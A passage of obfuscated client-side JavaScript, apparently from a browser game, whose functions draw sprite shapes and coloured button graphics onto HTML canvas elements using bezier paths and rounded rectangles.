			Δ.bezierCurveTo(ᐃ * 100.00003051757812, 38.17047119140625 * ᐃ, ᐃ * 102.00003051757812, 38.17047119140625 * ᐃ, ᐃ * 101.00003051757812, 47.17047119140625 * ᐃ);
			Δ.bezierCurveTo(101.00003051757812 * ᐃ, 63.67047119140625 * ᐃ, 101.00003051757812 * ᐃ, 63.67047119140625 * ᐃ, ᐃ * 101.00003051757812, 80.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.00003051757812, 84.17047119140625 * ᐃ, ᐃ * 100.00003051757812, ᐃ * 86.17047119140625, 95.00003051757812 * ᐃ, 88.17047119140625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84.00003051757812, ᐃ * 94.17047119140625, 89.00003051757812 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 79.00003051757812, ᐃ * 94.17047119140625);
			Δ.bezierCurveTo(59.500030517578125 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 59.500030517578125, ᐃ * 94.17047119140625, ᐃ * 40.000030517578125, 94.17047119140625 * ᐃ);
			Δ.bezierCurveTo(33.000030517578125 * ᐃ, ᐃ * 94.17047119140625, 34.000030517578125 * ᐃ, 94.17047119140625 * ᐃ, ᐃ * 34.000030517578125, ᐃ * 86.17047119140625);
			Δ.bezierCurveTo(34.000030517578125 * ᐃ, ᐃ * 69.67047119140625, 34.000030517578125 * ᐃ, ᐃ * 69.67047119140625, ᐃ * 34.000030517578125, ᐃ * 53.17047119140625);
			Δ.bezierCurveTo(33.000030517578125 * ᐃ, 47.17047119140625 * ᐃ, 34.000030517578125 * ᐃ, ᐃ * 47.17047119140625, 40.000030517578125 * ᐃ, 42.17047119140625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠⵠΔ, Ⲇᐃ[3], ⲆᐃᐃΔ * ᐃ);
			return Ⲇⵠ
		}

		function ⲆⵠᐃⵠΔᐃⵠΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = ᐃ * 400;
			Δ.translate(0, 15 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(102 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 108, 216.5 * ᐃ, 108 * ᐃ, 216.5 * ᐃ, ᐃ * 114, 279 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, 300 * ᐃ, ᐃ * 237, ᐃ * 299, 251 * ᐃ, ᐃ * 279);
			Δ.bezierCurveTo(ᐃ * 257, ᐃ * 217, ᐃ * 257, ᐃ * 217, 263 * ᐃ, 155 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, ᐃ * 194, 91 * ᐃ, 180 * ᐃ, 103 * ᐃ, ᐃ * 156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(102 * ᐃ, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 106, 53 * ᐃ, 255 * ᐃ, 53 * ᐃ, 263 * ᐃ, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 248, 38 * ᐃ, 99 * ᐃ, 69 * ᐃ, ᐃ * 103, ᐃ * 154);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[0], ᐃ * 11);
			Δ.translate(ΔΔⵠ, ᐃ * -ⵠⲆᐃᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(103 * ᐃ, ᐃ * 154);
			Δ.bezierCurveTo(98 * ᐃ, ᐃ * 119, 264 * ᐃ, ᐃ * 119, 264 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 271, 189 * ᐃ, 94 * ᐃ, ᐃ * 188, ᐃ * 103, ᐃ * 154);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ], Ⲇᐃ[2], 12 * ᐃ);
			Δ.translate(0, ᐃ * 25);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 103, ᐃ * 154);
			Δ.bezierCurveTo(98 * ᐃ, 119 * ᐃ, 264 * ᐃ, ᐃ * 119, ᐃ * 264, 154 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 271, 189 * ᐃ, ᐃ * 94, ᐃ * 188, ᐃ * 103, 154 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.translate(ⵠⲆⲆ, ᐃ * -25);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(102 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, 216.5 * ᐃ, ᐃ * 108, 216.5 * ᐃ, 114 * ᐃ, 279 * ᐃ);
			Δ.bezierCurveTo(124 * ᐃ, ᐃ * 300, 237 * ᐃ, ᐃ * 299, 251 * ᐃ, ᐃ * 279);
			Δ.bezierCurveTo(ᐃ * 257, ᐃ * 217, ᐃ * 257, 217 * ᐃ, 263 * ᐃ, 155 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 248, 194 * ᐃ, 91 * ᐃ, 180 * ᐃ, ᐃ * 103, ᐃ * 156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ⵠΔᐃᐃⵠ], ᐃ * ⵠΔᐃΔⵠⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 182, 185 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182.5, 237.5 * ᐃ, ᐃ * 182.5, 237.5 * ᐃ, 183 * ᐃ, 290 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], ⲆΔⲆΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 222, 287 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 226, ᐃ * 233.5, 226 * ᐃ, 233.5 * ᐃ, ᐃ * 230, ᐃ * 180);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔⵠᐃΔ, Ⲇᐃ[ⲆⲆΔᐃ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 145, ᐃ * 290);
			Δ.bezierCurveTo(ᐃ * 140.5, ᐃ * 237, ᐃ * 140.5, ᐃ * 237, ᐃ * 136, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 11);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 105, ᐃ * 184);
			Δ.bezierCurveTo(ᐃ * 148, 205 * ᐃ, 231 * ᐃ, 202 * ᐃ, ᐃ * 260, ᐃ * 182);
			Δ.bezierCurveTo(ᐃ * 259, 195.5 * ᐃ, ᐃ * 259, 195.5 * ᐃ, ᐃ * 258, ᐃ * 209);
			Δ.bezierCurveTo(ᐃ * 217, 218 * ᐃ, ᐃ * 163, ᐃ * 225, 108 * ᐃ, ᐃ * 207);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ], Ⲇᐃ[2], ⲆⵠΔⲆⲆⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 251, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 251.5, 267.5 * ᐃ, ᐃ * 251.5, 267.5 * ᐃ, 252 * ᐃ, 259 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212, 272 * ᐃ, 156 * ᐃ, 275 * ᐃ, 112 * ᐃ, ᐃ * 260);
			Δ.bezierCurveTo(112.5 * ᐃ, 269 * ᐃ, ᐃ * 112.5, ᐃ * 269, ᐃ * 113, 278 * ᐃ);
			Δ.bezierCurveTo(155 * ᐃ, ᐃ * 306, 253 * ᐃ, ᐃ * 286, ᐃ * 250, ᐃ * 276);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⵠΔΔ], ᐃ * 11);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 102, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 106, 53 * ᐃ, ᐃ * ⵠⲆⵠⵠᐃⲆⵠ, 53 * ᐃ, 263 * ᐃ, 154 * ᐃ);
			Δ.bezierCurveTo(248 * ᐃ, 38 * ᐃ, 99 * ᐃ, ᐃ * 69, ᐃ * 103, 154 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[2], 11 * ᐃ);
			return Ⲇⵠ
		}

		function ⲆᐃΔⵠΔᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = 170 * ᐃ;
			Δ.translate(0, -170 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 159.5, 322.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240.5, 293.0625 * ᐃ, ᐃ * 240.5, ᐃ * 293.0625, ᐃ * 321.5, ᐃ * 264.0625);
			Δ.bezierCurveTo(ᐃ * 276.5, 230.0625 * ᐃ, 276.5 * ᐃ, 230.0625 * ᐃ, ᐃ * 231.5, ᐃ * 196.0625);
			Δ.bezierCurveTo(158.5 * ᐃ, 221.5625 * ᐃ, ᐃ * 158.5, ᐃ * 221.5625, ᐃ * 85.5, 247.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔⵠⲆΔ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 212.5, 270.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 235, ᐃ * 261.5625, ᐃ * 235, 261.5625 * ᐃ, 257.5 * ᐃ, ᐃ * 253.0625);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[0], ΔᐃΔⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(193.5 * ᐃ, ᐃ * 226.0625);
			Δ.bezierCurveTo(204.5 * ᐃ, 242.0625 * ᐃ, 242.5 * ᐃ, 237.0625 * ᐃ, 251.5 * ᐃ, ᐃ * 225.0625);
			Δ.bezierCurveTo(246.5 * ᐃ, 195.0625 * ᐃ, ᐃ * 205.5, 190.0625 * ᐃ, ᐃ * 193.5, 227.0625 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ], Ⲇᐃ[3], ᐃ * ⲆΔⲆⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(164.5 * ᐃ, 245.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 182.5, 264.0625 * ᐃ, 252.5 * ᐃ, ᐃ * 258.0625, 276.5 * ᐃ, ᐃ * 244.0625);
			Δ.bezierCurveTo(265.5 * ᐃ, ᐃ * 226.0625, ᐃ * 244.5, 231.0625 * ᐃ, 229.5 * ᐃ, ᐃ * 230.0625);
			Δ.bezierCurveTo(ᐃ * 205.5, ᐃ * 227.0625, 175.5 * ᐃ, ᐃ * 202.0625, ᐃ * 162.5, ᐃ * 244.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ], Ⲇᐃ[3], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 115.5, 260.0625 * ᐃ);
			Δ.bezierCurveTo(134.5 * ᐃ, 279.0625 * ᐃ, ᐃ * 170.5, ᐃ * 275.0625, 191.5 * ᐃ, ᐃ * 257.0625);
			Δ.bezierCurveTo(174.5 * ᐃ, ᐃ * 208.0625, 142.5 * ᐃ, ᐃ * 197.0625, ᐃ * 116.5, ᐃ * 259.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(152.5 * ᐃ, 278.0625 * ᐃ);
			Δ.bezierCurveTo(165.5 * ᐃ, 294.0625 * ᐃ, 200.5 * ᐃ, 287.0625 * ᐃ, 216.5 * ᐃ, 278.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 206.5, ᐃ * 247.0625, 173.5 * ᐃ, 233.0625 * ᐃ, ᐃ * 153.5, ᐃ * 276.0625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[ⲆⲆΔⲆ], ᐃ * 12);
			return Ⲇⵠ
		}

		function ΔⵠⲆΔⵠΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 160;
			Ⲇⵠ.height = ᐃ * 161;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, 10 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 80.5, 78 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -71.5, -71 * ᐃ, 143 * ᐃ, 143 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.globalAlpha = ⵠΔⵠΔ;
			Δ.translate(0, -ΔᐃⲆⲆⵠ * ᐃ);
			Δ.save();
			Δ.translate(80.5 * ᐃ, 78 * ᐃ);
			Ⲇᐃᐃ(Δ, -71.5 * ᐃ, -71 * ᐃ, ᐃ * 143, 143 * ᐃ, ᐃ * ⵠᐃⲆⲆΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃΔ], 6 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 80, 78.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -ⲆᐃⲆⲆΔⲆⲆ * ᐃ, -72.5 * ᐃ, ᐃ * 34, 145 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 6);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠⲆᐃⵠ, 10 * ᐃ);
			Δ.save();
			Δ.translate(80 * ᐃ, 79.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -73 * ᐃ, -16.5 * ᐃ, 145 * ᐃ, ᐃ * 34, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = ΔⲆⵠ;
			Δ.translate(0, -10 * ᐃ);
			Δ.save();
			Δ.translate(80 * ᐃ, ᐃ * 79.5);
			Ⲇᐃᐃ(Δ, -73 * ᐃ, -16.5 * ᐃ, 145 * ᐃ, ᐃ * 34, ⲆⲆᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ⲆᐃⲆΔΔ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(ⲆΔⵠ, ⲆΔΔᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(79 * ᐃ, 71 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, 42 * ᐃ, ᐃ * 98, ᐃ * 36, ᐃ * 109, 43 * ᐃ);
			Δ.bezierCurveTo(119 * ᐃ, ᐃ * 47, 128 * ᐃ, ᐃ * 62, 107 * ᐃ, ᐃ * 72);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 78.5, ᐃ * 96, ᐃ * 78.5, ᐃ * 85, 85 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 84, 78 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 113, ᐃ * 82, 123 * ᐃ, 97 * ᐃ, ᐃ * 115, ᐃ * 108);
			Δ.bezierCurveTo(110 * ᐃ, ᐃ * 119, 98 * ᐃ, ᐃ * 124, ᐃ * 87, ᐃ * 107);
			Δ.bezierCurveTo(ᐃ * 81.5, 94.5 * ᐃ, 81.5 * ᐃ, 94.5 * ᐃ, 76 * ᐃ, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(80 * ᐃ, ᐃ * 73);
			Δ.bezierCurveTo(64 * ᐃ, ᐃ * 37, 55 * ᐃ, 34 * ᐃ, ᐃ * 45, 42 * ᐃ);
			Δ.bezierCurveTo(30 * ᐃ, 54 * ᐃ, 36 * ᐃ, ᐃ * 65, 51 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62.5, ᐃ * 77, 62.5 * ᐃ, 77 * ᐃ, ᐃ * 74, 82 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 82, ᐃ * 83);
			Δ.bezierCurveTo(ᐃ * 73, 107 * ᐃ, 60 * ᐃ, 123 * ᐃ, 47 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(33 * ᐃ, 105 * ᐃ, ᐃ * 33, 92 * ᐃ, ᐃ * 52, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 74, 73 * ᐃ, ᐃ * 77, ᐃ * 76, 76 * ᐃ, ᐃ * 75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.globalAlpha = ᐃᐃⲆΔ;
			Δ.translate(0, ᐃ * -10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 79, ᐃ * 71);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 42, ᐃ * 98, 36 * ᐃ, ᐃ * 109, 43 * ᐃ);
			Δ.bezierCurveTo(119 * ᐃ, 47 * ᐃ, ᐃ * 128, ᐃ * 62, 107 * ᐃ, ᐃ * 72);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 78.5, ᐃ * 96, 78.5 * ᐃ, ᐃ * 85, ᐃ * 85);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ], Ⲇᐃ[ΔⲆⲆⲆ], ⵠΔᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(84 * ᐃ, ᐃ * 78);
			Δ.bezierCurveTo(ᐃ * 113, 82 * ᐃ, 123 * ᐃ, ᐃ * 97, ᐃ * 115, 108 * ᐃ);
			Δ.bezierCurveTo(110 * ᐃ, 119 * ᐃ, 98 * ᐃ, ᐃ * 124, ᐃ * 87, ᐃ * 107);
			Δ.bezierCurveTo(81.5 * ᐃ, ᐃ * 94.5, 81.5 * ᐃ, ᐃ * 94.5, ᐃ * 76, 82 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠⵠΔᐃΔ], 6 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 80, 73 * ᐃ);
			Δ.bezierCurveTo(64 * ᐃ, ᐃ * 37, 55 * ᐃ, 34 * ᐃ, 45 * ᐃ, ᐃ * 42);
			Δ.bezierCurveTo(ᐃ * 30, 54 * ᐃ, ᐃ * 36, ᐃ * 65, ᐃ * 51, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62.5, 77 * ᐃ, 62.5 * ᐃ, 77 * ᐃ, 74 * ᐃ, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃⵠⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(82 * ᐃ, ᐃ * 83);
			Δ.bezierCurveTo(ᐃ * 73, ᐃ * 107, 60 * ᐃ, 123 * ᐃ, 47 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(33 * ᐃ, 105 * ᐃ, 33 * ᐃ, ᐃ * 92, 52 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(ᐃ * 74, ᐃ * 73, ᐃ * 77, 76 * ᐃ, 76 * ᐃ, ᐃ * 75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆᐃᐃΔ], ᐃ * ΔⵠⵠⲆΔ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(0, 10 * ᐃ);
			Δ.save();
			Δ.translate(78.5 * ᐃ, ᐃ * 78);
			Ⲇᐃᐃ(Δ, -13.5 * ᐃ, -ⵠΔΔⵠᐃᐃᐃ * ᐃ, ᐃ * 27, 27 * ᐃ, 6 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ⲆΔⵠ, ᐃ * -ⲆⲆⲆΔᐃ);
			Δ.save();
			Δ.translate(78.5 * ᐃ, ᐃ * 78);
			Ⲇᐃᐃ(Δ, -13.5 * ᐃ, ᐃ * -14, ᐃ * 27, ᐃ * 27, ᐃ * 6);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[ⵠΔᐃΔ], ᐃ * ᐃⵠⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ⲆΔⲆⵠⲆⲆⵠⲆᐃ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 950 * ᐃ;
			var ⲆΔΔᐃᐃⵠΔ = 180 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 50;
			var ΔᐃⵠᐃΔΔⵠ = 20 * ᐃ;
			var ΔⲆᐃⲆΔⵠⲆ = ᐃ * 240;
			var ᐃⲆⵠⵠⵠⵠⲆ = 35 * ᐃ;
			var ⵠⵠᐃΔΔᐃⲆ = ᐃ * ᐃᐃⲆΔ;
			var ⲆⲆⵠ = ⲆⵠᐃⲆ * ᐃ;
			var ⲆⵠⲆᐃⵠ = ᐃ * ⲆⲆⲆΔ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(Ⲇᐃⵠⵠ, ⵠⵠⵠᐃΔⲆⵠ * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, ⵠⵠᐃΔΔᐃⲆ, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#69A148", ⲆⵠⲆᐃⵠ);
			var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠⲆᐃ];
			Δ.drawImage(ᐃⵠ, ΔΔΔⲆⲆⲆᐃ, -8);
			Δ.translate(ΔⲆᐃⲆΔⵠⲆ, ΔⲆⲆ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, ⵠⵠᐃΔΔᐃⲆ, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#AF352A", ⲆⵠⲆᐃⵠ);
			var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔⲆⵠⲆᐃ];
			Δ.drawImage(ᐃⵠ, 17, -ᐃⵠⲆΔⲆᐃⲆ);
			Δ.translate(ΔⲆᐃⲆΔⵠⲆ, Ⲇᐃⵠⵠ);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, ⵠⵠᐃΔΔᐃⲆ, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#669BB1", ⲆⵠⲆᐃⵠ);
			var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⲆⵠⵠᐃⵠ];
			Δ.drawImage(ᐃⵠ, 17, -ⲆⲆᐃⵠΔ);
			Δ.translate(ΔⲆᐃⲆΔⵠⲆ, 0);
			Ⲇᐃᐃ(Δ, ᐃⲆⵠⵠⵠⵠⲆ, ⵠⵠᐃΔΔᐃⲆ, ⲆΔΔᐃᐃⵠΔ, ΔᐃⵠᐃΔΔⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, null, "#074A87", ⲆⵠⲆᐃⵠ);
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆⲆⲆ];
			Δ.drawImage(ᐃⵠ, ᐃⵠΔᐃᐃⵠⵠ, -ⵠⲆΔⵠᐃ);
			return Ⲇⵠ
		}

		function ⲆⵠᐃᐃⲆΔΔΔΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 158 * ᐃ;
			Ⲇⵠ.height = ᐃ * 201;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(96.5 * ᐃ, 76.421875 * ᐃ);
			Δ.bezierCurveTo(100.5 * ᐃ, ᐃ * 64.421875, 103.5 * ᐃ, 62.421875 * ᐃ, 110.5 * ᐃ, ᐃ * 65.421875);
			Δ.bezierCurveTo(ᐃ * 116.5, 66.421875 * ᐃ, 117.5 * ᐃ, 67.421875 * ᐃ, 112.5 * ᐃ, ᐃ * 73.421875);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * 79.921875, ᐃ * 107, 79.921875 * ᐃ, ᐃ * 101.5, ᐃ * 86.421875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[0], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(61.5 * ᐃ, ᐃ * 78.421875);
			Δ.bezierCurveTo(57.5 * ᐃ, ᐃ * 73.421875, 51.5 * ᐃ, 66.421875 * ᐃ, ᐃ * 45.5, 68.421875 * ᐃ);
			Δ.bezierCurveTo(32.5 * ᐃ, 73.421875 * ᐃ, ᐃ * 38.5, 75.421875 * ᐃ, 46.5 * ᐃ, ᐃ * 81.421875);
			Δ.bezierCurveTo(51.5 * ᐃ, 84.921875 * ᐃ, 51.5 * ᐃ, ᐃ * 84.921875, 56.5 * ᐃ, 88.421875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ⵠᐃⲆⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
